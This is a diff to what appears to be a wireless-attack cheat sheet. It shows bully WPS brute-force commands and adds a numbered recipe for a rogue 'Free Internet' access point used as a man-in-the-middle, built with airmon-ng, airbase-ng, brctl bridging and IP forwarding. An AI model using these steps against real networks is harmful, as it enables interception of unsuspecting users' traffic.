@@ -34,6 +34,22 @@ bully -b <BSSID> -L <interface>
 # adding the delay to prevent lock out, values of 60 seconds or more are recommended for most APs
 bully -b <BSSID> -1 <seconds> -2 <seconds> <interface>
 
+#Man In The Middle Attack
+1. Put the wireless interface to monitor mode
+# airmon-ng start <interface>
+2. Set up Access Point with the SSID like "Free Internet"
+# airbase-ng -c <channel> -e "Free Internet" <interface>
+3. Create a network bridge interface with the following commands:
+# brctl addbr br0
+# brctl addif br0 eth0
+# brctl addif br0 at0
+
+>>> if brctl not found, do the "sudo apt install bridge-utils
+
+# ifconfig br0 <ip_address> up 
+>> ip_address is based on the network configuration
+3. Enable IP packet forwarding
+# echo 1 > /proc/sys/net/ipv4/ip_forward
 
 
 
